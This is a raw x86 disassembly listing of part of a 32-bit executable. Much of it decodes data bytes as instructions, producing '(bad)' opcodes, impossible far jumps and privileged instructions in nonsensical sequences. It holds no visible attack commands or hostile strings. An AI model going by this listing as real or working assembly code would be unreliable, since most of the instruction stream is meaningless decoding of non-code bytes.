  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
  413a57:	dec    edi
  413a58:	cmp    cl,BYTE PTR [edi+0x36]
  413a5b:	dec    edi
  413a5c:	push   ds
  413a5d:	mov    ds:0xb30fa31f,al
  413a62:	or     al,0xb0
  413a64:	jl     0x413a26
  413a66:	jge    0x413a29
  413a68:	aas    
  413a69:	dec    edi
  413a6a:	ins    BYTE PTR es:[edi],dx
  413a6b:	dec    edi
  413a6c:	cmp    cl,BYTE PTR [edi+0x4e]
  413a6f:	dec    edi
  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	ss inc ebx
  413b8d:	add    BYTE PTR [edx+0x68],dh
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    DWORD PTR [ebx+0x0],eax
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [ecx]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi-0x581babec]
  413ea4:	jp     0x413e36
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    bh,dh
  413eaf:	jne    0x413eda
  413eb1:	outs   dx,BYTE PTR ds:[esi]
  413eb2:	dec    ecx
  413eb3:	(bad)  
  413eb4:	jno    0x413eec
  413eb6:	or     ah,BYTE PTR ds:0x4a67bdf1
  413ebc:	mov    ds:0xf1c92d81,al
  413ec1:	dec    esi
  413ec2:	das    
  413ec3:	test   al,0xda
  413ec5:	cs mov ebp,0x24ebb91
  413ecb:	mov    ch,0xb0
  413ecd:	sahf   
  413ece:	or     eax,DWORD PTR [eax+0x49]
  413ed1:	mov    ah,0x71
  413ed3:	sbb    esi,DWORD PTR [esi-0x75]
  413ed6:	adc    BYTE PTR [edx],dh
  413ed8:	out    dx,al
  413ed9:	nop
  413eda:	push   ecx
  413edb:	dec    ebp
  413edc:	mov    cl,0x13
  413ede:	fiadd  DWORD PTR [eax]
  413ee0:	out    0x90,al
  413ee2:	stc    
  413ee3:	out    dx,al
  413ee4:	sub    ebx,DWORD PTR [ecx-0x32]
  413ee7:	ret    0x87fb
  413eea:	js     0x413f67
  413eec:	pop    es
  413eed:	sub    ebp,DWORD PTR [edx+0x6d85782b]
  413ef3:	cld    
  413ef4:	push   0x5a
  413ef6:	scas   eax,DWORD PTR es:[edi]
  413ef7:	push   edi
  413ef8:	nop
  413ef9:	dec    edx
  413efa:	retf   0x6ff
  413efd:	ja     0x413efc
  413eff:	mov    edi,0xfb1bbd93
  413f04:	sub    esp,ebx
  413f06:	mov    dh,0xdd
  413f08:	or     ecx,DWORD PTR [esi+0x213a6d36]
  413f0e:	clc    
  413f0f:	ins    BYTE PTR es:[edi],dx
  413f10:	cs in  eax,dx
  413f12:	fsubr  DWORD PTR [esi-0x63]
  413f15:	retf   
  413f16:	es sub cl,dh
  413f19:	xchg   esi,eax
  413f1a:	push   ebx
  413f1b:	ss scas eax,DWORD PTR es:[edi]
  413f1d:	lahf   
  413f1e:	xor    bl,BYTE PTR [edi]
  413f20:	outs   dx,DWORD PTR ds:[esi]
  413f21:	ds push es
  413f23:	pop    esp
  413f24:	jns    0x413f81
  413f26:	jmp    0x43c3:0x74761f4a
  413f2d:	ror    ecx,cl
  413f2f:	cmp    edi,DWORD PTR [eax+0x4c]
  413f32:	outs   dx,BYTE PTR ds:[esi]
  413f33:	call   DWORD PTR [ecx+0x3e]
  413f36:	dec    edi
  413f37:	cli    
  413f38:	dec    ebp
  413f39:	ret    0x4f1d
  413f3c:	cmc    
  413f3d:	shl    ch,cl
  413f3f:	and    eax,0x7740d575
  413f44:	ret    
  413f45:	in     al,dx
  413f46:	loopne 0x413fb0
  413f48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f49:	mov    ch,0x2d
  413f4b:	push   eax
  413f4c:	test   BYTE PTR [ecx+edi*4],cl
  413f4f:	xchg   ecx,eax
  413f50:	jo     0x413fc9
  413f52:	mov    bl,0x9b
  413f54:	iret   
  413f55:	outs   dx,BYTE PTR ds:[esi]
  413f56:	(bad)  
  413f57:	sub    BYTE PTR ds:0x2b917425,0x57
  413f5e:	ss sahf 
  413f60:	mov    esi,0x71470152
  413f65:	sub    BYTE PTR [ecx+edx*1-0x7f],cl
  413f69:	or     eax,0xd3539851
  413f6e:	inc    ecx
  413f6f:	bound  esp,QWORD PTR ds:0xa4506f4c
  413f75:	rcr    BYTE PTR [ebx],1
  413f77:	sub    edi,ebp
  413f79:	push   edi
  413f7a:	aaa    
  413f7b:	aad    0x9b
  413f7d:	mov    dl,0x43
  413f7f:	push   esp
  413f80:	pop    esi
  413f81:	adc    al,0x4b
  413f83:	mov    ebx,0x52ab0eb2
  413f88:	rcl    DWORD PTR [ecx],cl
  413f8a:	dec    ecx
  413f8b:	test   BYTE PTR [esi],cl
  413f8d:	pop    ebp
  413f8e:	ret    0x384
  413f91:	xor    al,0x49
  413f93:	pop    DWORD PTR [ecx+ecx*1]
  413f96:	xchg   edi,eax
  413f97:	push   ebp
  413f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f99:	mov    ebx,0x9f0b4512
  413f9e:	mov    ebx,0x5082e1b7
  413fa3:	mov    eax,0xfa4e243b
  413fa8:	xchg   edx,eax
  413fa9:	call   0xd4d73657
  413fae:	enter  0xda6d,0x6c
  413fb2:	xchg   esi,eax
  413fb3:	jmp    0x0:0x3c
	...
  414016:	pop    edx
  414017:	ficom  DWORD PTR [esi+0x60]
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x85847bf9
  414025:	jo     0x41401b
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    BYTE PTR [eax+ebx*1],al
  414030:	push   ebp
  414031:	mov    bh,BYTE PTR [ebx+0x7]
  414034:	rol    BYTE PTR [esi+ecx*2],1
  414037:	xor    DWORD PTR [eax],0x5e
  41403a:	inc    ecx
  41403b:	imul   edi,edi,0xf
  41403e:	sub    cl,BYTE PTR [ecx+0x1b]
  414041:	fstp   QWORD PTR [ecx]
  414043:	cmp    DWORD PTR [ebp+0x4e],ebp
  414046:	inc    ecx
  414047:	lea    ecx,[edx+0x3a]
  41404a:	and    eax,0xd72146f0
  41404f:	adc    ebp,DWORD PTR [edx-0x348b4525]
  414055:	jns    0x41407f
  414057:	rcr    BYTE PTR [edx+0x53acd6e1],1
  41405d:	lods   eax,DWORD PTR ds:[esi]
  41405e:	rcl    bh,1
  414060:	pushf  
  414061:	mov    ebx,0x8ed5ac8
  414066:	out    dx,al
  414067:	enter  0xc26e,0xa2
  41406b:	retf   
  41406c:	rcr    BYTE PTR [esi+0x5b],1
  41406f:	cld    
  414070:	push   ebx
  414071:	inc    esi
  414072:	jmp    0xccd2:0x38cdcb7e
  414079:	out    dx,eax
  41407a:	pop    ds
  41407b:	lods   eax,DWORD PTR ds:[esi]
  41407c:	xchg   ebx,eax
  41407d:	sbb    bl,al
  41407f:	sub    al,0x8c
  414081:	and    DWORD PTR [esi-0x3042af5e],eax
  414087:	iret   
  414088:	mov    edx,0xd80959fe
  41408d:	dec    edi
  41408e:	mov    ebx,0xbb30f900
  414093:	cli    
  414094:	aaa    
  414095:	scas   eax,DWORD PTR es:[edi]
  414096:	fstp   DWORD PTR [ecx+edx*4-0x67cb5cf5]
  41409d:	and    DWORD PTR [eax+0x4afc2698],ecx
  4140a3:	fist   WORD PTR [esi]
  4140a5:	jecxz  0x41410a
  4140a7:	pop    ss
  4140a8:	jnp    0x4140e9
  4140aa:	cmp    ch,BYTE PTR [ecx]
  4140ac:	shl    BYTE PTR [eax-0x75ffebb2],1
  4140b2:	mov    BYTE PTR [ebp+edi*4+0x597dea37],dh
  4140b9:	test   DWORD PTR ds:0x8d9fbc8f,ebp
  4140bf:	mov    ebx,0xbeefddff
  4140c4:	arpl   WORD PTR [eax],bp
  4140c6:	adc    esp,esp
  4140c8:	xor    bl,BYTE PTR [eax+0x779d5bd7]
  4140ce:	shl    DWORD PTR [ebx+ebx*8],1
  4140d1:	div    DWORD PTR [ebp+eiz*4+0x5bb6a37b]
  4140d8:	sbb    eax,0xa3704fbc
  4140dd:	pop    esp
  4140de:	ja     0x414091
  4140e0:	lea    esp,[ecx-0x31]
  4140e3:	pop    ebp
  4140e4:	rcr    BYTE PTR [esi-0x224ec600],cl
  4140ea:	push   edi
  4140eb:	cdq    
  4140ec:	mov    ebx,0x287368c6
  4140f1:	mov    BYTE PTR [esp+edx*1],ch
  4140f4:	arpl   WORD PTR [esi+0x67512185],bp
  4140fa:	mov    bl,0xd0
  4140fc:	inc    esp
  4140fd:	inc    edx
  4140fe:	jle    0x41410d
  414100:	mov    ah,0x14
  414102:	mov    WORD PTR [edi-0x15],ds
  414105:	movhps xmm2,QWORD PTR [esi-0x48c2b66e]
  41410c:	cli    
  41410d:	ja     0x4140c7
  41410f:	out    0x72,al
  414111:	adc    cl,cl
  414113:	xor    bl,0xc7
  414116:	add    esp,0xffffff97
  414119:	ret    0xed7a
  41411c:	mov    dh,BYTE PTR [ebx+0x4d]
  41411f:	mov    bh,0x35
  414121:	mov    bl,0x6
  414123:	icebp  
  414124:	dec    esp
  414125:	mov    bl,0xd8
  414127:	jno    0x414145
  414129:	jb     0x4140f2
  41412b:	out    0xe9,eax
  41412d:	push   0xefe7bca2
  414132:	mov    ds:0xb426,al
	...
  414193:	add    BYTE PTR [eax],al
  414195:	add    BYTE PTR [edx],al
  414197:	adc    al,BYTE PTR [ecx]
  414199:	mov    ds:0xb3a2b311,eax
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0x9c500fb4
  4141a5:	inc    esi
  4141a6:	sti    
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [edx],bh
  4141af:	sub    ch,ch
  4141b1:	daa    
  4141b2:	inc    eax
  4141b3:	jne    0x414196
  4141b5:	push   0xffffff90
  4141b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141b8:	test   DWORD PTR [edx],edi
  4141ba:	std    
  4141bb:	rdmsr  
  4141bd:	push   eax
  4141be:	imul   ebx,DWORD PTR [ecx+0x10d995ea],0x883daf8f
  4141c8:	repz mov ebx,0x1abc4b82
  4141ce:	mov    eax,0xb598eb85
  4141d3:	repnz mov edi,0xa5875001
  4141d9:	sub    ch,BYTE PTR [ebx]
  4141db:	mov    bh,0x2a
  4141dd:	adc    ebx,edx
  4141df:	pop    edi
  4141e0:	cdq    
  4141e1:	dec    edx
  4141e2:	lods   al,BYTE PTR ds:[esi]
  4141e3:	out    0xb1,al
  4141e5:	jbe    0x41419b
  4141e7:	add    dh,BYTE PTR [ecx+0x70583b78]
  4141ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141ee:	shr    DWORD PTR [ebp+0x5d],1
  4141f1:	sub    al,0x22
  4141f3:	cs jnp 0x41418c
  4141f6:	std    
  4141f7:	or     eax,DWORD PTR [ebx+0x1]
  4141fa:	xchg   edi,eax
  4141fb:	xor    eax,0x908af031
  414200:	scas   eax,DWORD PTR es:[edi]
  414201:	xchg   ebp,edi
  414203:	xor    DWORD PTR [eax+0x2a],esi
  414206:	jle    0x414261
  414208:	xchg   DWORD PTR gs:[eax-0x930b5c0],esp
  41420f:	mov    ds:0x3ea15c83,eax
  414214:	lods   al,BYTE PTR ds:[esi]
  414215:	jo     0x4141b3
  414217:	mov    dl,0xa0
  414219:	cmp    cl,BYTE PTR [edx+0x6236e246]
  41421f:	imul   ebx,DWORD PTR [ecx],0xdf49b9b6
  414225:	xor    al,BYTE PTR [ecx+0x39697594]
  41422b:	rcl    bl,0x72
  41422e:	and    esi,DWORD PTR [ecx+0x7a]
  414231:	inc    edx
  414232:	jle    0x41424f
  414234:	iret   
  414235:	or     ch,ah
  414237:	mov    ch,0xf9
  414239:	xor    eax,0xbdb0a451
  41423e:	or     al,0x2e
  414240:	stos   DWORD PTR es:[edi],eax
  414241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414242:	(bad)  
  414243:	jne    0x41425e
  414245:	xchg   esp,eax
  414246:	outs   dx,DWORD PTR ds:[esi]
  414247:	stos   DWORD PTR es:[edi],eax
  414248:	dec    ecx
  414249:	arpl   bx,bx
  41424b:	jnp    0x41423d
  41424d:	dec    ebp
  41424e:	in     al,dx
  41424f:	pop    edx
  414250:	ja     0x414207
  414252:	(bad)  
  414254:	jmp    0xec12:0x8d723216
  41425b:	inc    esi
  41425c:	sub    edx,eax
  41425e:	(bad)  
  41425f:	push   edx
  414261:	fst    DWORD PTR [ebp+0x1d]
  414264:	cli    
  414265:	(bad)  
  414266:	icebp  
